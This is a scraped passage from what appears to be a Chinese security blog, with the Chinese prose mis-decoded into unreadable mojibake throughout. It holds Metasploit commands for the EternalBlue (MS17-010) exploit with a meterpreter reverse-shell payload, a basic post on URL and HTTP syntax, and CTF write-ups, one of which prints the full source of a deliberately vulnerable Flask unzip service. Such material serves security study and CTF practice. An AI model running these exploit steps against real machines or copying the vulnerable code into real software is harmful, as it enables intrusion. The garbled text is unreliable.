<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole										    #è¿›å…¥æ¡†æ¶</span><br><span class="line">search  ms17_010                                    # ä½¿ç”¨searchå‘½ä»¤æŸ¥æ‰¾ç›¸å…³æ¼æ´</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue        # ä½¿ç”¨useè¿›å…¥æ¨¡å—</span><br><span class="line">info     										    #ä½¿ç”¨infoæŸ¥çœ‹æ¨¡å—ä¿¡æ¯</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp    	#è®¾ç½®æ”»å‡»è½½è·</span><br><span class="line">show options    									#æŸ¥çœ‹æ¨¡å—éœ€è¦é…ç½®çš„å‚æ•°</span><br><span class="line">set  RHOST  192.168.100.158    					    #è®¾ç½®å‚æ•°</span><br><span class="line">exploit / run     								    #æ”»å‡»</span><br><span class="line">åæ¸—é€é˜¶æ®µ											#åæ¸—é€é˜¶æ®µ</span><br></pre></td></tr></table></div></figure>

<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/11f51f93.html">URLå’ŒHTTPåè®®</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-09-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/11f51f93.html" data-flag-title="URLå’ŒHTTPåè®®"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="URL"   >
          <a href="#URL" class="heading-link"><i class="fas fa-link"></i></a><a href="#URL" class="headerlink" title="URL"></a>URL</h1>
      <p>é‡äº‹ä¸å†³å…ˆç™¾åº¦</p>
<blockquote>
<p>å› ç‰¹ç½‘ä¸Šçš„å¯ç”¨èµ„æºå¯ä»¥ç”¨ç®€å•å­—ç¬¦ä¸²æ¥è¡¨ç¤ºï¼Œè¯¥æ–‡æ¡£å°±æ˜¯æè¿°äº†è¿™ç§å­—ç¬¦ä¸²çš„è¯­æ³•å’Œè¯­ä¹‰ã€‚è€Œè¿™äº›å­—ç¬¦ä¸²åˆ™è¢«ç§°ä¸ºï¼šâ€œ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E5%99%A8/7682460?fromModule=lemma_inlink" >ç»Ÿä¸€èµ„æºå®šä½å™¨</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>â€ï¼ˆURLï¼‰ã€‚è¿™ç¯‡è¯´æ˜æºäºä¸‡ç»´ç½‘å…¨çƒä¿¡æ¯ä¸»åŠ¨ç»„ç»‡ï¼ˆWorld Wide Web global informationinitiativeï¼‰ä»‹ç»çš„æ¦‚å¿µã€‚RFC1630ã€Šé€šç”¨èµ„æºæ ‡å¿—ç¬¦ã€‹æè¿°äº†ä¸€äº›å¯¹è±¡æ•°æ®ï¼Œä»–ä»¬è‡ª1990å¹´èµ·å°±å¼€å§‹ä½¿ç”¨è¿™äº›å¯¹è±¡æ•°æ®ã€‚è¿™ç¯‡URLè¯´æ˜ç¬¦åˆã€Šå› ç‰¹ç½‘èµ„æºå®šä½ç¬¦çš„åŠŸèƒ½éœ€æ±‚ï¼ˆFunctional Requirements for Internet Resource Locatorsï¼‰ã€‹ä¸­è¯´æ˜çš„éœ€æ±‚ã€‚è¿™ç¯‡æ–‡æ¡£æ˜¯ç”±å·¥ç¨‹ä»»åŠ¡ç»„ç»‡ï¼ˆIETFï¼‰çš„URIå·¥ä½œå°ç»„å†™çš„ </p>
</blockquote>
<p>è‚¯å®šçœ‹ä¸æ‡‚å¯¹å§ï¼Œæ²¡å…³ç³»ï¼Œä½ åªéœ€è¦çŸ¥é“è¿™ä¸ªä¸œè¥¿æ˜¯ç”¨æ¥å¯»æ‰¾äº’è”ç½‘ä¸Šçš„èµ„æºå°±å¯ä»¥äº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹ä¸€ä¸ªURLçš„å®Œæ•´æ ¼å¼</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</span><br></pre></td></tr></table></div></figure>

<p>è´´å¿ƒçš„ä¸­æ–‡ç¿»è¯‘</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åè®®:[//[ç”¨æˆ·[:å¯†ç ]@]ä¸»æœº[:ç«¯å£]][/è·¯å¾„][?é˜Ÿåˆ—][#ç‰‡æ®µ]</span><br></pre></td></tr></table></div></figure>

<p>ä¸‹é¢æˆ‘ä»¬ä»¥ä¸€ä¸ªhttpåè®®çš„urlæ¥å¯¹ä¸Šé¢çš„å†…å®¹åšä¸€ä¸ªè§£é‡Š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jlan.darkflow.top/posts/58958.html</span><br></pre></td></tr></table></div></figure>

<p>æˆ‘ä»¬æ¥æŒ‰ç…§ä¸Šé¢çš„è¯­æ³•æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªæ˜¯ä»€ä¹ˆå†…å®¹</p>
<p>é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯httpåè®®æ¥å¯¹jlan.darkflow.topè¿™ä¸ªæœåŠ¡ä¸»æœºè¿›è¡Œè®¿é—®ï¼Œè®¿é—®çš„æ˜¯/posts/58958.htmlè¿™ä¸ªç½‘é¡µèµ„æºï¼Œè¿™æ—¶å€™åº”è¯¥å°±ä¼šæœ‰äººé—®äº†ï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªhttpçš„URLé‡Œé¢æ²¡æœ‰ç”¨æˆ·å•Šå¯†ç å•Šç«¯å£ä¹‹ç±»çš„ä¸œè¥¿å‘¢ï¼Œå¾ˆç®€å•ï¼Œå› ä¸ºè¿™äº›å†…å®¹éƒ½æ˜¯å¯é€‰é¡¹ï¼Œè€Œhttpåè®®å†…å®¹åŸºæœ¬éƒ½æ˜¯å…¬å¼€è®¿é—®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦æŒ‡æ˜æˆ‘ä»¬ç”¨æˆ·çš„èº«ä»½ï¼Œå¹¶ä¸”httpåè®®çš„é»˜è®¤ç«¯å£æ˜¯80ç«¯å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è®¿é—®è¿™ä¸ªURLçš„æ—¶å€™ä¼šè‡ªåŠ¨çš„å»80ç«¯å£å¯»æ‰¾èµ„æº</p>
<p>é‚£å¦‚æœæˆ‘ä»¬æ²¡æœ‰æŠŠhttpæœåŠ¡æ”¾åœ¨80ç«¯å£è€Œæ˜¯æ”¾åœ¨å…¶ä»–ç«¯å£å‘¢ï¼Œæ¥åšä¸ªå®éªŒï¼Œæˆ‘ä»¬ç”¨flaskèµ·ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œä½¿ç”¨80ç«¯å£ä½œä¸ºhttpæœåŠ¡çš„ç«¯å£<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243049.png"></p>
<p>æˆ‘ä»¬æ¥ç›´æ¥è®¿é—®çœ‹çœ‹ï¼Œè™½ç„¶æˆ‘ä»¬æ²¡æœ‰åœ¨URLä¸­æ·»åŠ ç«¯å£ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹ŸæˆåŠŸè®¿é—®åˆ°äº†æˆ‘ä»¬çš„webç«™ç‚¹ï¼Œæ·»åŠ äº†80ç«¯å£ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”ç”±äºæµè§ˆå™¨çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬åœ¨æ·»åŠ 80ç«¯å£åˆ°URLä¸­æ—¶é»˜è®¤æ˜¯ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥çš„</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262245054.png"></p>
<p>ä¸‹ä¸€æ­¥å°±æ˜¯å°†é»˜è®¤ç«¯å£è¿›è¡Œæ›´æ”¹ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨ä»£ç ä¸­å°†ç«¯å£æ›´æ”¹ä¸ºäº†10010ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å†æ¥ç›´æ¥è®¿é—®çœ‹çœ‹</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243232.png"></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç°åœ¨ç”¨é»˜è®¤çš„80ç«¯å£å·²ç»è¡Œä¸é€šäº†ï¼Œé‚£æˆ‘ä»¬å°±åŠ ä¸Šæˆ‘ä»¬è‡ªå®šä¹‰çš„ç«¯å£å·å†æ¥è®¿é—®</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262248667.png"></p>
<p>å¯ä»¥çœ‹åˆ°è®¿é—®æˆåŠŸï¼Œå¹¶ä¸”åœ¨åœ°å€æ ä¹Ÿå‡ºç°äº†æˆ‘ä»¬è¾“å…¥çš„è‡ªå®šä¹‰ç«¯å£å·</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262251416.png"></p>
<p>é‚£ä¸‹ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸ªftpåè®®çš„URL</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://jlan@127.0.0.1/xxx/flag</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªå°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬ä»¥Jlançš„èº«ä»½åœ¨127.0.0.1æœåŠ¡å™¨ä¸Šé¢æ‹¿ä¸€ä»½flagï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹Ÿæ²¡æœ‰æŒ‡å®šç«¯å£ï¼Œå› ä¸ºftpåè®®ä¹Ÿæ˜¯æœ‰é»˜è®¤ç«¯å£çš„ï¼Œå…¶å®å‡ ä¹æ‰€æœ‰åè®®éƒ½ä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„ç«¯å£å·ï¼Œåœ¨ä¸€äº›ä½¿ç”¨è¿™äº›åè®®çš„ç¨‹åºä¸­å¤§éƒ¨åˆ†æƒ…å†µæˆ‘ä»¬éƒ½ä¸éœ€è¦å†é¢å¤–æ·»åŠ ç«¯å£</p>

        <h1 id="HTTP"   >
          <a href="#HTTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1>
      <p>è¯´å®Œäº†URLæˆ‘ä»¬æ¥è¯´å¦ä¸€ä¸ªwebçš„åŸºç¡€çŸ¥è¯†å°±æ˜¯HTTPåè®®ï¼ŒåŒæ ·å…ˆç™¾åº¦</p>
<blockquote>
<p>HTTPåè®®æ˜¯Hyper Text Transfer Protocolï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰çš„ç¼©å†™,æ˜¯ç”¨äºä»ä¸‡ç»´ç½‘ï¼ˆWWW:World Wide Web ï¼‰æœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ é€åè®®ã€‚</p>
<p>HTTPæ˜¯ä¸€ä¸ªåŸºäºTCP/IPé€šä¿¡åè®®æ¥ä¼ é€’æ•°æ®ï¼ˆHTML æ–‡ä»¶, å›¾ç‰‡æ–‡ä»¶, æŸ¥è¯¢ç»“æœç­‰ï¼‰ã€‚</p>
<p>HTTPæ˜¯ä¸€ä¸ªå±äºåº”ç”¨å±‚çš„é¢å‘å¯¹è±¡çš„åè®®ï¼Œç”±äºå…¶ç®€æ·ã€å¿«é€Ÿçš„æ–¹å¼ï¼Œé€‚ç”¨äºåˆ†å¸ƒå¼è¶…åª’ä½“ä¿¡æ¯ç³»ç»Ÿã€‚å®ƒäº1990å¹´æå‡ºï¼Œç»è¿‡å‡ å¹´çš„ä½¿ç”¨ä¸å‘å±•ï¼Œå¾—åˆ°ä¸æ–­åœ°å®Œå–„å’Œæ‰©å±•ã€‚ç›®å‰åœ¨WWWä¸­ä½¿ç”¨çš„æ˜¯HTTP/1.0çš„ç¬¬å…­ç‰ˆï¼ŒHTTP/1.1çš„è§„èŒƒåŒ–å·¥ä½œæ­£åœ¨è¿›è¡Œä¹‹ä¸­ï¼Œè€Œä¸”HTTP-NG(Next Generation of HTTP)çš„å»ºè®®å·²ç»æå‡ºã€‚</p>
<p>HTTPåè®®å·¥ä½œäºå®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¶æ„ä¸ºä¸Šã€‚æµè§ˆå™¨ä½œä¸ºHTTPå®¢æˆ·ç«¯é€šè¿‡URLå‘HTTPæœåŠ¡ç«¯å³WEBæœåŠ¡å™¨å‘é€æ‰€æœ‰è¯·æ±‚ã€‚WebæœåŠ¡å™¨æ ¹æ®æ¥æ”¶åˆ°çš„è¯·æ±‚åï¼Œå‘å®¢æˆ·ç«¯å‘é€å“åº”ä¿¡æ¯ã€‚</p>
</blockquote>
<p><img   src="https://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2" style=""  alt="img"></p>
<p>ä¸Šé¢è¿™å¼ å›¾å°±å¾ˆå¥½çš„è¯´æ˜äº†HTTPåè®®å®šä¹‰çš„å†…å®¹</p>
<p>å•Šåæ­£HTTPåè®®å°±æ˜¯ä¸€ç§ä¼ è¾“ç½‘é¡µå†…å®¹çš„åè®®ï¼Œåè®®å°±æ˜¯åŒæ–¹å®šä¹‰äº†ä¸€ç§æ•°æ®äº¤æ¢çš„æ–¹å¼ï¼ŒæŒ‰ç…§è§„å®šçš„æ ¼å¼æ¥ä¼ è¾“æ•°æ®ï¼Œwebæ‰‹æ‰€è°“çš„â€œæŠ“åŒ…â€å°±æ˜¯å¯¹HTTPçš„æ•°æ®åŒ…è¿›è¡Œæ‹¦æˆªï¼Œç„¶åå–å‡ºå…¶ä¸­çš„åŸå§‹æ•°æ®ï¼Œå¤šè¯´æ— ç›Šï¼Œæˆ‘ä»¬æ¥å®é™…æŠ“åŒ…å°è¯•ä¸€ä¸‹ï¼Œè¿˜æ˜¯ä½¿ç”¨åˆšæ‰çš„webæœåŠ¡å™¨</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262325345.png"></p>
<p>çœ‹è¿™é‡Œå°±æ˜¯ä¸€æ•´ä¸ªå®Œæ•´çš„è¯·æ±‚å’Œå“åº”å†…å®¹äº†ï¼Œç¬¬ä¸€è¡Œæ˜¯è¯·æ±‚çš„æ–¹æ³•å’Œåè®®ï¼Œåé¢æ¯è¡Œéƒ½æ˜¯ä¸€ä¸ªè¯·æ±‚æ ‡å¤´ï¼Œæœ€åæœ‰ä¸€ä¸ªå›è½¦å’Œæ¢è¡Œç»“æŸï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„GETè¯·æ±‚ï¼Œé‚£POSTç±»å‹çš„è¯·æ±‚æ˜¯ä»€ä¹ˆæ ·å­çš„å‘¢ï¼Œæˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262335979.png"></p>
<p>å‘ç°è¯·æ±‚çš„æœ€ä¸‹é¢æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ï¼Œå¹¶ä¸”åˆå¤šäº†ä¸€ä¸ªå«åšContent-Lengthçš„è¯·æ±‚å¤´ï¼Œè¿™ä¸ªè¯·æ±‚å¤´å°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨ï¼Œæˆ‘ä»¬åœ¨æœ€åä¸€ä¸ªæ¢è¡Œä¹‹åè¿˜æœ‰9å­—èŠ‚çš„å†…å®¹éœ€è¦ä¼ è¾“ï¼Œæˆ‘ä»¬è¯•è¯•åœ¨æœåŠ¡å™¨ä¸­å°†å†…å®¹å–å‡ºå¹¶ä¸”å›æ˜¾ï¼Œé‚£å¦‚æœæˆ‘ä»¬ä¿®æ”¹è¿™ä¸ªè¯·æ±‚å¤´è®©å®ƒæ¯”æˆ‘ä»¬å®é™…çš„è¯·æ±‚çŸ­ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262336473.png"></p>
<p>å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æŒ‰ç…§æˆ‘ä»¬çš„è¯·æ±‚å¤´å£°æ˜çš„ä¸€æ ·ï¼Œåªå–äº†å‰8ä½çš„å†…å®¹ï¼Œè¿”å›äº†jla</p>
<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/94d6ea88.html">MTCTF 2022</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-09-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/94d6ea88.html" data-flag-title="MTCTF 2022"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h2 id="babyjava"   >
          <a href="#babyjava" class="heading-link"><i class="fas fa-link"></i></a><a href="#babyjava" class="headerlink" title="babyjava"></a>babyjava</h2>
      <p>ç›´æ¥æœXpathæ³¨å…¥å·¥å…·</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.zhihuifly.com/t/topic/370" >https://www.zhihuifly.com/t/topic/370</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æŒ‰ç…§å¯¹åº”çš„URLä¸postä¼ å‚</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171837552.png"></p>
<p>æŒ‰è¯´æ˜ä¸€å±‚å±‚çˆ†å‡ºç»“æœï¼Œæœ€ç»ˆæ–‡æ¡£æ ‘å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">	user</span><br><span class="line">		usernameï¼ˆflagåœ¨é‡Œé¢ï¼‰</span><br></pre></td></tr></table></div></figure>

<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171843715.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;273f7d50-2f92-47ba-b5d4-358ae3add895&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="OnlineUnzip"   >
          <a href="#OnlineUnzip" class="heading-link"><i class="fas fa-link"></i></a><a href="#OnlineUnzip" class="headerlink" title="OnlineUnzip"></a>OnlineUnzip</h2>
      <p>æºç </p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, request, render_template, url_for, make_response</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extractFile</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    extractdir=filepath.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line">    os.system(<span class="string">f&#x27;unzip -o <span class="subst">&#123;filepath&#125;</span> -d <span class="subst">&#123;extractdir&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;display&#x27;</span>,extractdir=extractdir))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/display&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/display/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/display/&lt;path:extractdir&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">extractdir=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.&quot;</span>, extractdir, re.M | re.I) != <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker?&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;error&quot;</span>, <span class="number">404</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(extractdir):</span><br><span class="line">                f = <span class="built_in">open</span>(extractdir, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">                response = make_response(f.read())</span><br><span class="line">                response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fn = os.listdir(extractdir)</span><br><span class="line">                fn = [<span class="string">&quot;..&quot;</span>] + fn</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;templates/template.html&quot;</span>)</span><br><span class="line">                x = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">                ret = <span class="string">&quot;&lt;h1&gt;æ–‡ä»¶åˆ—è¡¨:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&quot;</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> fn:</span><br><span class="line">                    tpath = os.path.join(<span class="string">&#x27;/display&#x27;</span>, extractdir, i)</span><br><span class="line">                    ret += <span class="string">&quot;&lt;a href=&#x27;&quot;</span> + tpath + <span class="string">&quot;&#x27;&gt;&quot;</span> + i + <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span></span><br><span class="line">                x = x.replace(<span class="string">&quot;HTMLTEXT&quot;</span>, ret)</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    uploadpath = <span class="string">&#x27;uploads/&#x27;</span> + md5(ip.encode()).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(uploadpath):</span><br><span class="line">        os.makedirs(uploadpath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            upFile = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">            <span class="built_in">print</span>(upFile.filename)</span><br><span class="line">            <span class="keyword">if</span> os.path.splitext(upFile.filename)[-<span class="number">1</span>]==<span class="string">&#x27;.zip&#x27;</span>:</span><br><span class="line">                filepath=<span class="string">f&quot;<span class="subst">&#123;uploadpath&#125;</span>/<span class="subst">&#123;md5(upFile.filename.encode()).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]&#125;</span>.zip&quot;</span></span><br><span class="line">                upFile.save(filepath)</span><br><span class="line">                zipDatas = extractFile(filepath)</span><br><span class="line">                <span class="keyword">return</span> zipDatas</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;upFile.filename&#125;</span> is not a zip file !&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;error&quot;</span>, <span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></div></figure>

